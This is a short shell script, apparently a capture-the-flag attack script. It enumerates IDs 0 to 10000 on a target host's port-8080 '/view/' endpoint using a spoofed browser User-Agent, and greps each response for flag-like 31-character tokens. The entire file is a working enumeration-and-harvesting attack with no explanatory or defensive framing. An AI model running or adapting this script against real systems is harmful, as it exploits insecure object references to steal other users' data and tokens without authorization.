#!/bin/sh
for a in {0..10000}; do
	curl -H 'User-Agent: Mozilla/5.6 Gecko' -s $1:8080/view/$a | /bin/grep -oP '[A-Z0-9]{31}='
done
